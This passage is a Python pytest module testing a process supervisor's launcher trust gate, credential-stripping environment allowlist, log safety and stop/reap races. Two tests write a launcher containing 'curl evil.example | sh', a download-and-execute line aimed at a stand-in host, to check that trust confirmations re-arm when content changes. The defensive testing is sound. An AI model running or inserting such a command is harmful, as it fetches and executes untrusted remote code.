"""LWSM-1009 — the Supervisor spawns and reaps process groups.

Contract: `docs/decisions/0003-launch-via-project-scripts.md`, plus the three
security items whose implementation the ROADMAP lands here — LWSM-1046 (the
trust gate), LWSM-1047 (signal handles, never bare PIDs) and LWSM-1048 (the
environment allowlist).

The acceptance test is `test_a_wrapper_script_and_its_child_are_fully_reaped`:
a `start.sh` that spawns a Python child which binds a port, stopped, with
nothing left holding the port. Everything else here exists because it is a
property a passing acceptance test would not have noticed.
"""

from __future__ import annotations

import contextlib
import json
import os
import socket
import stat
import subprocess
import sys
import textwrap
import threading
import time
from pathlib import Path
from unittest import mock

import psutil
import pytest

from lwsm import supervisor as supervisor_module
from lwsm.ports import PortProbe, PortSnapshot
from lwsm.supervisor import (
    ENV_ALLOWLIST,
    MAX_LOG_BYTES,
    ROTATION_SUFFIX,
    AlreadyRunning,
    LauncherRefused,
    LauncherUntrusted,
    ManagedProcess,
    PortAlreadyBound,
    StopOutcome,
    Supervisor,
    _launcher_path,
    build_child_env,
    launcher_fingerprint,
    validate_launcher,
)

# --------------------------------------------------------------------------
# Fakes and helpers
# --------------------------------------------------------------------------


class FakeProbe:
    """A socket table we control, so the pre-flight check is deterministic."""

    def __init__(self, listening: set[int] | None = None) -> None:
        self.listening = set(listening or ())

    def snapshot(self) -> PortSnapshot:
        return PortSnapshot(frozenset(self.listening))


def free_port() -> int:
    """A port nothing is listening on right now.

    Racy by nature — there is no way to reserve one — but the window is
    microseconds and the alternative is a hard-coded port that collides with
    whatever the developer happens to be running.
    """
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


def wait_until(predicate, timeout: float = 10.0, interval: float = 0.02) -> bool:
    """Poll `predicate` until it is true or `timeout` elapses.

    `testing.md § T4` forbids sleeping for a duration and asserting afterwards;
    this waits for the condition instead. pytest-qt's `qtbot.waitUntil` is the
    Qt equivalent, and this module has no Qt in it.
    """
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if predicate():
            return True
        time.sleep(interval)
    return predicate()


@pytest.fixture
def project(tmp_path: Path) -> Path:
    directory = tmp_path / "demo-project"
    directory.mkdir()
    return directory


@pytest.fixture
def supervisor(tmp_path: Path):
    """A supervisor logging into the test's own directory, always emptied.

    The finalizer **stops** what is left before closing, which `close()`
    deliberately does not do — ADR-0003 leaves servers running on manager exit,
    and that is the supervisor's contract, not this fixture's. A test that fails
    mid-sequence would otherwise leave a child alive, and `filterwarnings =
    ["error"]` turns the resulting `ResourceWarning` into a second failure at
    the end of the session that hides the first.
    """
    sup = Supervisor(probe=FakeProbe(), log_dir=tmp_path / "logs")
    try:
        yield sup
    finally:
        for path in sup.running():
            sup.stop(path, grace=0.5)
        sup.close()


def await_ready(project: Path, timeout: float = 5.0) -> None:
    """Block until a launcher that touches `ready` has actually spawned.

    **Stopping a child that has not finished starting leaks its grandchild**,
    and it leaks it silently. `killpg` sweeps the group as it is at that
    instant, so a `sleep` forked a microsecond later is never signalled, is
    reparented to init, and outlives the run -- while `stop()` reports a clean
    `StopOutcome` and the test passes. Measured 2026-08-24: one orphan per run
    from a test that called `stop()` immediately after `start()`.

    The launcher backgrounds the real process FIRST and touches the file
    second, so the file existing proves the grandchild exists. A bare sleep
    would only make the race less likely.
    """
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if (project / "ready").exists():
            return
        time.sleep(0.02)
    raise AssertionError("the launcher never signalled that it had started")


def write_launcher(project: Path, body: str, name: str = "start.sh") -> Path:
    path = project / name
    path.write_text("#!/bin/sh\n" + textwrap.dedent(body), encoding="utf-8")
    path.chmod(0o700)
    return path


def binding_wrapper(project: Path, port: int) -> Path:
    """`start.sh` that spawns a Python child which binds `port` and stays up.

    The child is a **separate process**, not a `exec`'d replacement, so a stop
    that only signalled the launcher would leave it holding the port. That is
    the whole point of the acceptance test and the reason this fixture is
    shaped this way.
    """
    child = project / "child.py"
    child.write_text(
        textwrap.dedent(f"""
            import socket, sys, time
            sock = socket.socket()
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", {port}))
            sock.listen(1)
            print("child", flush=True)
            while True:
                time.sleep(0.05)
        """),
        encoding="utf-8",
    )
    return write_launcher(
        project,
        f"""
        {sys.executable} {child} &
        echo launcher
        wait
        """,
    )


# --------------------------------------------------------------------------
# LWSM-1048 — the child environment is an allowlist, not an inheritance
# --------------------------------------------------------------------------


def test_credentials_are_not_handed_to_a_launched_project() -> None:
    env = build_child_env(
        port=3000,
        base={
            "PATH": "/usr/bin",
            "SSH_AUTH_SOCK": "/run/user/1000/keyring/ssh",
            "AWS_SECRET_ACCESS_KEY": "hunter2",
            "GITHUB_TOKEN": "ghp_x",
        },
    )
    assert env["PATH"] == "/usr/bin"
    assert "SSH_AUTH_SOCK" not in env
    assert "AWS_SECRET_ACCESS_KEY" not in env
    assert "GITHUB_TOKEN" not in env


def test_the_two_variables_the_contract_adds_are_present() -> None:
    env = build_child_env(port=4321, base={"PATH": "/usr/bin"})
    assert env["PORT"] == "4321"
    assert env["LWSM_MANAGED"] == "1"


def test_no_effective_port_means_no_PORT_variable() -> None:
    """ADR-0002 case 3: absence must be the unchanged path.

    Exporting `PORT=` or `PORT=None` is not the same as not exporting it — a
    launcher reading `${PORT:-3000}` gets an empty string rather than its own
    default, which is the failure that ADR exists to prevent.
    """
    env = build_child_env(port=None, base={"PATH": "/usr/bin"})
    assert "PORT" not in env
    assert env["LWSM_MANAGED"] == "1"


def test_locale_variables_pass_by_prefix_but_arbitrary_ones_do_not() -> None:
    env = build_child_env(
        port=None, base={"LC_ALL": "C", "LC_TIME": "en_GB.UTF-8", "LCD_BRIGHT": "9"}
    )
    assert env["LC_ALL"] == "C"
    assert env["LC_TIME"] == "en_GB.UTF-8"
    assert "LCD_BRIGHT" not in env


def test_the_allowlist_does_not_contain_a_credential_carrier() -> None:
    """A source invariant, not a behaviour: the list is edited by hand.

    Naming the carriers here means a future addition of `SSH_AUTH_SOCK` or an
    `*_TOKEN` reddens on the commit that makes it rather than at the next
    security review.
    """
    forbidden = {"SSH_AUTH_SOCK", "GPG_AGENT_INFO", "AWS_SECRET_ACCESS_KEY"}
    assert not (ENV_ALLOWLIST & forbidden)
    suffixes = ("_TOKEN", "_KEY", "_SECRET")
    assert not any(name.endswith(suffixes) for name in ENV_ALLOWLIST)


# --------------------------------------------------------------------------
# LWSM-1046 — a discovered launcher is untrusted until confirmed
# --------------------------------------------------------------------------


def test_a_launcher_symlinked_out_of_the_project_is_refused(
    project: Path, tmp_path: Path
) -> None:
    outside = tmp_path / "elsewhere.sh"
    outside.write_text("#!/bin/sh\necho hi\n", encoding="utf-8")
    outside.chmod(0o700)
    link = project / "start.sh"
    link.symlink_to(outside)

    with pytest.raises(LauncherRefused) as caught:
        validate_launcher(project, link)
    assert "outside" in str(caught.value)


def test_a_symlink_that_stays_inside_the_project_is_allowed(project: Path) -> None:
    """The refusal is about *leaving* the project, not about symlinks.

    ADR-0003 § Trust says "a symlink pointing outside its project"; refusing
    every symlink would reject the ordinary `start.sh -> scripts/start.sh`
    arrangement, and a rule that fires on the legitimate case gets switched off.
    """
    real = write_launcher(project, "echo hi\n", name="real.sh")
    link = project / "start.sh"
    link.symlink_to(real)
    validate_launcher(project, link)


@pytest.mark.parametrize(
    ("argv", "link_name"),
    [(("./start.sh",), "start.sh"), (("python3", "serve.py"), "serve.py")],
)
def test_start_refuses_a_launcher_symlinked_out_of_the_project(
    supervisor: Supervisor,
    project: Path,
    tmp_path: Path,
    argv: tuple[str, ...],
    link_name: str,
) -> None:
    """The refusal above has to be reachable from `start()`, not only by hand.

    `validate_launcher` had this rule and was never called for the escaping
    case: `_contained` resolved the symlink, saw it leave the project, and
    returned `None` — which `_launcher_path` reports as "this argv names no
    file of ours", the same answer it gives `npm run dev`. So the launcher was
    never validated and the fingerprint hashed argv alone (LWSM-1162).

    The trust is confirmed first *on purpose*: without it a `LauncherUntrusted`
    would look like the refusal working. Against the unfixed code this test
    raises nothing at all and spawns the outside file.

    Parametrised over two launcher kinds because the escape is per-argument —
    `./start.sh` names the file at `argv[0]`, `python3 serve.py` at `argv[1]` —
    and one fixture per branch is what LWSM-1132 cost.
    """
    outside = tmp_path / "elsewhere"
    outside.write_text("#!/bin/sh\npass\n", encoding="utf-8")
    outside.chmod(0o700)
    (project / link_name).symlink_to(outside)
    supervisor.trust.confirm(project, launcher_fingerprint(project, argv))

    with pytest.raises(LauncherRefused) as caught:
        supervisor.start(project, name="demo", argv=list(argv), port=None)
    assert "outside" in str(caught.value)
    assert not supervisor.running()


def test_an_escaping_symlink_does_not_fingerprint_as_a_missing_launcher(
    project: Path, tmp_path: Path
) -> None:
    """Two different situations must not hash the same (LWSM-1162).

    Both fell through to the `\\0nofile\\0` marker, so a launcher pointing out
    of the project fingerprinted identically to one that does not exist — and
    rewriting the target's content left the fingerprint unchanged, which is the
    re-arm ADR-0003 asks for never happening.
    """
    argv = ("./start.sh",)
    missing = launcher_fingerprint(project, argv)

    outside = tmp_path / "elsewhere.sh"
    outside.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    (project / "start.sh").symlink_to(outside)
    escaping = launcher_fingerprint(project, argv)
    assert escaping != missing

    outside.write_text("#!/bin/sh\ncurl evil.example | sh\n", encoding="utf-8")
    assert launcher_fingerprint(project, argv) != escaping


@pytest.mark.parametrize("mode", [0o770, 0o707, 0o777])
def test_a_group_or_other_writable_launcher_is_refused(
    project: Path, mode: int
) -> None:
    launcher = write_launcher(project, "echo hi\n")
    launcher.chmod(mode)
    with pytest.raises(LauncherRefused) as caught:
        validate_launcher(project, launcher)
    assert "writable" in str(caught.value)


@pytest.mark.parametrize("mode", [0o775, 0o777], ids=["group", "other"])
def test_a_launcher_in_a_writable_directory_is_refused(
    project: Path, mode: int
) -> None:
    """Replacing a file needs write on its DIRECTORY, not on the file.

    The refusal above covers the launcher's own mode, and its reason -
    "whoever else can write it changes what they vouched for afterwards" - is
    defeated by unlink-and-create in a directory anyone else can write
    (LWSM-1226). The file's own `0755` is no protection at all there.

    All seven of this machine's real project directories are `drwxr-xr-x`,
    measured before this landed, so the refusal costs nothing that works
    today.
    """
    launcher = write_launcher(project, "echo hi\n")
    project.chmod(mode)
    try:
        with pytest.raises(LauncherRefused) as caught:
            validate_launcher(project, launcher)
    finally:
        project.chmod(0o755)
    assert "writable" in str(caught.value)


def test_a_sticky_writable_directory_is_allowed(project: Path) -> None:
    """`/tmp` is `1777`, and the sticky bit is exactly what makes it safe.

    With it set only the owner may unlink, so the replacement this refusal
    exists to stop cannot happen — refusing here would reject a legitimate
    location and teach nobody anything.
    """
    launcher = write_launcher(project, "echo hi\n")
    project.chmod(0o1777)
    try:
        assert validate_launcher(project, launcher) == launcher.resolve()
    finally:
        project.chmod(0o755)


def test_a_launcher_owned_by_someone_else_is_refused(
    project: Path, monkeypatch
) -> None:
    """A launcher we do not own can be rewritten by whoever does.

    Ownership was not checked at all. Root is allowed: a file owned by root in
    a directory we control is the ordinary shape of a system-installed
    launcher, and refusing it would reject working setups.

    `os.stat` is patched rather than the file chowned, which needs privileges
    a test does not have and must not want.
    """
    launcher = write_launcher(project, "echo hi\n")
    real = os.stat

    def owned_by_a_stranger(path, *args, **kwargs):
        info = real(path, *args, **kwargs)
        if Path(path) == launcher.resolve():
            return os.stat_result(
                (info.st_mode, info.st_ino, info.st_dev, info.st_nlink, 4242)
                + tuple(info)[5:]
            )
        return info

    monkeypatch.setattr(os, "stat", owned_by_a_stranger)

    with pytest.raises(LauncherRefused) as caught:
        validate_launcher(project, launcher)
    assert "owned" in str(caught.value)


def test_a_root_owned_launcher_is_allowed(project: Path, monkeypatch) -> None:
    """The carve-out in the ownership check, pinned.

    A root-owned launcher in a directory we control is the ordinary shape of a
    system-installed one, so refusing it would reject working setups. Without
    this, narrowing the check to `st_uid != os.getuid()` passes every other
    test — a carve-out written and measured by nothing.
    """
    launcher = write_launcher(project, "echo hi\n")
    real = os.stat

    def owned_by_root(path, *args, **kwargs):
        info = real(path, *args, **kwargs)
        if Path(path) == launcher.resolve():
            return os.stat_result(
                (info.st_mode, info.st_ino, info.st_dev, info.st_nlink, 0)
                + tuple(info)[5:]
            )
        return info

    monkeypatch.setattr(os, "stat", owned_by_root)

    assert validate_launcher(project, launcher) == launcher.resolve()


def test_a_launcher_that_is_not_a_regular_file_is_refused(project: Path) -> None:
    (project / "start.sh").mkdir()
    with pytest.raises(LauncherRefused):
        validate_launcher(project, project / "start.sh")


def test_start_refuses_an_unconfirmed_launcher_and_names_what_would_run(
    supervisor: Supervisor, project: Path
) -> None:
    """The refusal must carry the resolved path and the exact argv.

    ADR-0003: "The confirmation is not security theatre only if it shows what
    will actually run: the resolved path and argv, never a friendly summary."
    The dialog is LWSM-1010's; carrying the material is this module's.
    """
    launcher = write_launcher(project, "echo hi\n")

    with pytest.raises(LauncherUntrusted) as caught:
        supervisor.start(project, name="demo", argv=["./start.sh"], port=None)

    refusal = caught.value
    assert refusal.resolved == launcher.resolve()
    assert refusal.argv == ("./start.sh",)
    assert refusal.fingerprint == launcher_fingerprint(project, ("./start.sh",))


def test_confirming_once_is_enough_for_the_next_start(
    supervisor: Supervisor, project: Path
) -> None:
    write_launcher(project, "exit 0\n")
    argv = ["./start.sh"]
    supervisor.trust.confirm(project, launcher_fingerprint(project, tuple(argv)))

    managed = supervisor.start(project, name="demo", argv=argv, port=None)
    assert managed.pid > 0
    supervisor.stop(project)


def test_the_confirmation_re_arms_when_the_launcher_content_changes(
    supervisor: Supervisor, project: Path
) -> None:
    launcher = write_launcher(project, "exit 0\n")
    argv = ("./start.sh",)
    supervisor.trust.confirm(project, launcher_fingerprint(project, argv))
    assert supervisor.trust.is_confirmed(project, launcher_fingerprint(project, argv))

    launcher.write_text("#!/bin/sh\ncurl evil.example | sh\n", encoding="utf-8")
    changed = launcher_fingerprint(project, argv)
    assert not supervisor.trust.is_confirmed(project, changed)


def test_the_confirmation_re_arms_when_the_command_changes(project: Path) -> None:
    """The argv is part of the fingerprint, not only the file's bytes.

    `npm run dev` and `npm run deploy` read the same `package.json`; if only
    file content were hashed, confirming the first would silently authorise
    the second.
    """
    write_launcher(project, "exit 0\n")
    assert launcher_fingerprint(project, ("npm", "run", "dev")) != launcher_fingerprint(
        project, ("npm", "run", "deploy")
    )


# --------------------------------------------------------------------------
# LWSM-1165 — a child that exits on its own must not hold its slot
# --------------------------------------------------------------------------


def test_a_child_that_exits_on_its_own_is_dropped_and_can_be_started_again(
    supervisor: Supervisor, project: Path
) -> None:
    """Only `start()` inserted and only `stop()` popped, so nothing removed the
    entry for a launcher that died by itself.

    After a missing dependency, a bad `scripts.dev` or an ordinary crash the
    port is free, `_classify` returns STOPPED and the UI disables Stop and
    Restart — so every later Start raised `AlreadyRunning` with no route back
    for the rest of the session. The log descriptor was never closed either.
    LWSM-1134 fixed the overlay symptom and left the entry.
    """
    argv = ("./start.sh",)
    write_launcher(project, "exit 3\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, argv))
    supervisor.start(project, name="demo", argv=list(argv), port=None)
    assert wait_until(lambda: supervisor.exited(project))

    collected = supervisor.reap_exited()

    assert collected == {project.resolve(): 3}, "the exit status is not collected"
    assert not supervisor.running()
    # The point of the whole item: there is a route back.
    supervisor.start(project, name="demo", argv=list(argv), port=None)


def test_a_launcher_that_forks_and_exits_keeps_its_entry(
    supervisor: Supervisor, project: Path
) -> None:
    """The guard against the obvious wrong fix, and the reason this is not a
    one-line change.

    `start.sh` that spawns a server and exits leaves the LAUNCHER gone and the
    server alive in the same process group — which is precisely the
    double-forking wrapper `_group_members` and LWSM-1009's acceptance test
    exist for. Dropping the entry on the launcher's death alone would orphan
    that server: `stop()` signals the group through the entry, so with the
    entry gone the port stays bound with no Stop button and no way back. That
    is worse than the defect being fixed.

    So the cheap check (is the launcher gone?) only selects a candidate; the
    group is what decides.
    """
    child = project / "child.py"
    child.write_text("import time\nwhile True:\n    time.sleep(0.05)\n", "utf-8")
    write_launcher(project, f"{sys.executable} {child} &\necho launcher\n")
    argv = ("./start.sh",)
    supervisor.trust.confirm(project, launcher_fingerprint(project, argv))
    supervisor.start(project, name="demo", argv=list(argv), port=None)

    assert wait_until(lambda: supervisor.exited(project)), "the launcher never exited"
    assert supervisor.reap_exited() == {}
    assert project.resolve() in supervisor.running(), (
        "the entry stop() signals the group through was dropped while the "
        "server was still running"
    )


def test_reaping_after_a_completed_stop_finds_nothing_to_do(
    supervisor: Supervisor, project: Path
) -> None:
    """The SEQUENTIAL case, and it is worth exactly what it says and no more.

    It does not reach the identity check below — `stop()` popped before
    `running()` was even sampled, so the loop has nothing to iterate. Measured:
    deleting that check leaves this test green. Its sibling is the one that
    covers it, and this pair is here because a back-to-back pair of calls
    proving nothing about a check-then-act is a trap this project has already
    paid for once.
    """
    argv = ("./start.sh",)
    write_launcher(project, "exit 0\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, argv))
    supervisor.start(project, name="demo", argv=list(argv), port=None)
    assert wait_until(lambda: supervisor.exited(project))

    supervisor.stop(project)

    assert supervisor.reap_exited() == {}


def test_a_reap_racing_a_stop_does_not_release_one_descriptor_twice(
    supervisor: Supervisor, project: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Whoever pops owns the sequence (LWSM-1138), and `reap_exited` is a
    second popper.

    Both would otherwise reach `_close_quietly(managed.log_fd)`, and the second
    `os.close` operates on an integer the kernel is free to have reissued — to
    another project's log, or to the rotation backup.

    **The first call has to be HELD OPEN inside the window**, or the GIL
    serialises the two and the broken code passes. The window here is between
    `running()` releasing the lock and the pop re-taking it, so the stop is
    parked inside `_group_members`, which is called in exactly that gap. It
    fires once and then delegates, because `stop()` calls `_group_members`
    itself and would otherwise recurse forever.

    The assertion is on the DESCRIPTOR rather than on the return value: two
    plausible-looking returns is what the broken version already gives.
    """
    argv = ("./start.sh",)
    write_launcher(project, "exit 0\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, argv))
    managed = supervisor.start(project, name="demo", argv=list(argv), port=None)
    assert wait_until(lambda: supervisor.exited(project))

    released: list[int] = []
    real_close = supervisor_module._close_quietly

    def counting_close(fd: int) -> None:
        released.append(fd)
        real_close(fd)

    monkeypatch.setattr(supervisor_module, "_close_quietly", counting_close)

    real_members = supervisor._group_members
    fired: list[bool] = []

    def stop_inside_the_window(managed_process: ManagedProcess):
        if not fired:
            fired.append(True)
            supervisor.stop(project)
        return real_members(managed_process)

    monkeypatch.setattr(supervisor, "_group_members", stop_inside_the_window)

    assert supervisor.reap_exited() == {}
    assert fired, "the stop never ran inside the window; the test proves nothing"
    assert released == [managed.log_fd], "the descriptor was released twice"


# --------------------------------------------------------------------------
# The pre-flight port check (step 1 of every start)
# --------------------------------------------------------------------------


def test_start_refuses_when_the_effective_port_is_already_bound(
    tmp_path: Path, project: Path
) -> None:
    sup = Supervisor(probe=FakeProbe({8080}), log_dir=tmp_path / "logs")
    write_launcher(project, "exit 0\n")
    sup.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    try:
        with pytest.raises(PortAlreadyBound) as caught:
            sup.start(project, name="demo", argv=["./start.sh"], port=8080)
        assert caught.value.port == 8080
    finally:
        sup.close()


def test_a_start_with_no_known_port_skips_the_pre_flight_check(
    supervisor: Supervisor, project: Path
) -> None:
    """`port is None` means *unknown*, and unknown is not a conflict.

    The same rule the scanner holds: a project whose port could not be read is
    still startable, and the poll classifies it afterwards.
    """
    write_launcher(project, "exit 0\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    assert managed.pid > 0
    supervisor.stop(project)


# --------------------------------------------------------------------------
# The per-project log file
# --------------------------------------------------------------------------


@pytest.mark.integration
def test_the_log_receives_merged_output_and_is_private(
    supervisor: Supervisor, project: Path
) -> None:
    write_launcher(project, "echo to-stdout\necho to-stderr >&2\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))

    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    # Waited for, not slept on: stopping straight after the spawn signalled the
    # shell before it had written anything, and the empty log read as a defect
    # in the redirection rather than as the race it was.
    assert wait_until(
        lambda: "to-stderr" in managed.log_path.read_text(encoding="utf-8")
    ), "the launcher's output never reached its log file"
    supervisor.stop(project)

    text = managed.log_path.read_text(encoding="utf-8")
    assert "to-stdout" in text
    assert "to-stderr" in text
    assert stat.S_IMODE(managed.log_path.stat().st_mode) == 0o600
    assert stat.S_IMODE(managed.log_path.parent.stat().st_mode) == 0o700


def test_a_symlink_planted_at_the_log_path_is_refused(
    tmp_path: Path, project: Path
) -> None:
    """`applog.py`'s rule, applied to the per-project logs.

    A symlink at `<project>.log` pointing at `~/.bashrc` would append a hostile
    project's stdout into it. Same defect, different file, so the same
    `O_NOFOLLOW` plus fstat discipline.
    """
    log_dir = tmp_path / "logs"
    sup = Supervisor(probe=FakeProbe(), log_dir=log_dir)
    write_launcher(project, "exit 0\n")
    sup.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    try:
        target = tmp_path / "victim"
        target.write_text("", encoding="utf-8")
        log_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
        sup.log_path_for(project, "demo").symlink_to(target)

        with pytest.raises(OSError):
            sup.start(project, name="demo", argv=["./start.sh"], port=None)
        assert target.read_text(encoding="utf-8") == ""
    finally:
        sup.close()


@pytest.mark.integration
def test_the_log_rotates_once_at_the_cap_and_the_child_keeps_writing(
    supervisor: Supervisor, project: Path
) -> None:
    """One rotation, and the running child's writes still land in the live file.

    The child inherits a *duplicate* of our descriptor, so renaming the file
    would leave it writing into an unlinked inode — output that exists nowhere
    a reader can see it. Copy-then-truncate keeps the inode, which is why the
    rotation is shaped that way rather than as a rename.
    """
    # Writing in a loop, not once: a single echo lands before the rotation and
    # ends up in the rotated copy, which would make the "still writing" half of
    # this test assert nothing.
    write_launcher(project, "while true; do echo after-rotation; sleep 0.05; done\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)

    # Written through our own descriptor so the child is still alive and still
    # holding its own: a file grown after the child started is exactly the case.
    os.pwrite(managed.log_fd, b"x" * (MAX_LOG_BYTES + 1), 0)
    supervisor.rotate_if_needed(project)

    rotated = managed.log_path.with_name(managed.log_path.name + ".1")
    assert rotated.exists()
    assert rotated.stat().st_size > MAX_LOG_BYTES
    assert managed.log_path.stat().st_size < MAX_LOG_BYTES

    assert wait_until(
        lambda: "after-rotation" in managed.log_path.read_text(encoding="utf-8")
    ), "the running child's output did not reach the live log after rotation"
    supervisor.stop(project)


# --------------------------------------------------------------------------
# Stop — the acceptance test and the properties around it
# --------------------------------------------------------------------------


@pytest.mark.integration
def test_a_wrapper_script_and_its_child_are_fully_reaped(
    supervisor: Supervisor, project: Path
) -> None:
    """LWSM-1009's stated acceptance: no orphan holds the port.

    `start.sh` spawns a Python child that binds a port and stays up. Signalling
    only the launcher leaves that child running; signalling the process group
    takes both. The port is the assertion because it is the property the user
    actually has — a Stop that leaves the port bound has not stopped anything.
    """
    port = free_port()
    binding_wrapper(project, port)
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))

    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=port)
    probe = PortProbe()
    assert wait_until(lambda: probe.snapshot().is_bound(port)), (
        "the fixture never bound its port, so the reaping assertion would be vacuous"
    )
    grandchild = next(
        proc.pid
        for proc in psutil.process_iter()
        if _pgid(proc.pid) == managed.pid and proc.pid != managed.pid
    )

    outcome = supervisor.stop(project)

    assert not outcome.port_still_bound
    assert wait_until(lambda: not probe.snapshot().is_bound(port))
    assert not psutil.pid_exists(grandchild) or not _alive(grandchild)
    assert outcome.exit_code is not None


@pytest.mark.integration
def test_a_start_during_the_stop_sequence_is_refused(
    supervisor: Supervisor, project: Path
) -> None:
    """LWSM-1168 — the counterpart of LWSM-1137's `starting` set.

    `stop()` pops the entry under the lock and then holds nothing for the whole
    grace, kill and reap window. A `start()` arriving inside it finds the
    project in neither `processes` nor `starting`, passes the pre-flight and
    spawns a SECOND child; the old sequence then kills the old group while the
    new one holds the port, and the manager reports its own new server as one
    it did not start.

    The window is HELD OPEN rather than raced for: `_on_wait` fires once per
    turn of the wait loop, which is exactly inside it. Two calls issued back to
    back would serialise on the GIL often enough to pass against broken code.
    """
    write_launcher(
        project,
        """
        trap '' TERM
        echo trap-installed
        while true; do sleep 0.05; done
        """,
    )
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    assert wait_until(
        lambda: "trap-installed" in managed.log_path.read_text(encoding="utf-8")
    ), "the launcher never reported installing its SIGTERM trap"

    attempts: list[object] = []

    def start_again() -> None:
        if attempts:
            return
        try:
            attempts.append(
                supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
            )
        except AlreadyRunning as exc:
            attempts.append(exc)

    supervisor.stop(project, grace=0.5, _on_wait=start_again)

    assert attempts, "_on_wait never fired, so nothing was tried inside the window"
    assert isinstance(attempts[0], AlreadyRunning), (
        f"a second child was spawned mid-stop: {attempts[0]!r}"
    )


@pytest.mark.integration
def test_is_stopping_is_true_only_inside_the_stop_window(
    supervisor: Supervisor, project: Path
) -> None:
    """The fact the UI gates Start on (LWSM-1191), read from the real registry.

    Neither `running()` nor `exited()` can answer it: `stop()` pops the entry
    before it signals anything, so a stopping project is in neither map. Held
    open at `_on_wait` for the reason the sibling above gives — raced for, the
    window is usually already shut by the time anything looks.

    Before and after are asserted with it, so a mutant that simply returns True
    dies: the reservation has to be released, or the Start button gated on it
    never comes back.
    """
    write_launcher(project, "while true; do sleep 0.05; done")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    supervisor.start(project, name="demo", argv=["./start.sh"], port=None)

    assert not supervisor.is_stopping(project), "precondition: nothing is stopping"

    seen: list[bool] = []

    def ask_inside_the_window() -> None:
        seen.append(supervisor.is_stopping(project))

    supervisor.stop(project, grace=0.5, _on_wait=ask_inside_the_window)

    assert seen, "_on_wait never fired, so nothing was asked inside the window"
    assert seen[0] is True
    assert not supervisor.is_stopping(project), (
        "the reservation outlived the stop, so Start would never come back"
    )


@pytest.mark.integration
def test_a_stop_that_raises_still_releases_the_project(
    supervisor: Supervisor, project: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The reservation is discarded in a `finally`, for LWSM-1137's reason.

    One that only ran on the success path would turn a single failed stop into
    a project that can never be started again this session — and the failure
    would be invisible, since the child really did die.

    `_port_after_stop` is the seam because it runs LAST: the child is already
    signalled and reaped, so the raise leaves nothing behind to warn about.
    """
    write_launcher(project, "while true; do sleep 0.05; done\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    monkeypatch.setattr(Supervisor, "_port_after_stop", lambda self, managed: 1 / 0)

    with pytest.raises(ZeroDivisionError):
        supervisor.stop(project, grace=0.5)

    monkeypatch.undo()
    supervisor.start(project, name="demo", argv=["./start.sh"], port=None)


@pytest.mark.integration
def test_a_stop_during_the_stop_sequence_is_still_idempotent(
    supervisor: Supervisor, project: Path
) -> None:
    """The reservation gates `start()` and nothing else.

    `stop()`'s own contract is that whoever pops owns the sequence and a later
    caller returns an empty outcome — that is what makes it idempotent, and a
    reservation that refused the second caller would break it.
    """
    write_launcher(
        project,
        """
        trap '' TERM
        echo trap-installed
        while true; do sleep 0.05; done
        """,
    )
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    assert wait_until(
        lambda: "trap-installed" in managed.log_path.read_text(encoding="utf-8")
    ), "the launcher never reported installing its SIGTERM trap"

    seen: list[StopOutcome] = []

    def stop_again() -> None:
        if seen:
            return
        seen.append(supervisor.stop(project, grace=0.1))

    supervisor.stop(project, grace=0.5, _on_wait=stop_again)

    assert seen, "_on_wait never fired"
    assert seen[0] == StopOutcome()


@pytest.mark.integration
def test_a_process_forked_during_the_grace_window_is_still_stopped(
    supervisor: Supervisor, project: Path
) -> None:
    """ADR-0003 calls stopping the whole tree "the single most important
    correctness property of the Stop button".

    The group was enumerated ONCE, before the first SIGTERM. Anything that
    joined it afterwards — a trap handler that respawns, an `npm run dev`
    watcher, a node cluster replacing a worker — was in no list, received
    neither signal, survived holding the port, and `StopOutcome` came back
    clean (LWSM-1204).

    This is not `CLAUDE.md`'s start-race trap, which is about stopping a child
    that has not finished starting. Here the child is fully up — the launcher
    reports its trap installed and is polled until it has — and the new
    process appears strictly during the grace window, in response to the
    SIGTERM itself.
    """
    write_launcher(
        project,
        """
        trap 'sleep 30 & echo $! > respawned.pid; exit 0' TERM
        echo trap-installed
        while true; do sleep 0.05; done
        """,
    )
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    assert wait_until(
        lambda: "trap-installed" in managed.log_path.read_text(encoding="utf-8")
    ), "the launcher never reported installing its SIGTERM trap"

    outcome = supervisor.stop(project, grace=0.5)

    marker = project / "respawned.pid"
    assert wait_until(lambda: marker.exists()), "the trap never ran"
    respawned = int(marker.read_text(encoding="utf-8").strip())
    try:
        assert not _alive(respawned), (
            "a process forked into the group during the grace window outlived "
            "the stop, which reported success"
        )
    finally:
        # Never leave it behind: an escaped `sleep 30` is the leak this file's
        # own fixture exists to prevent, and a failing assertion above would
        # otherwise hand one to every later run.
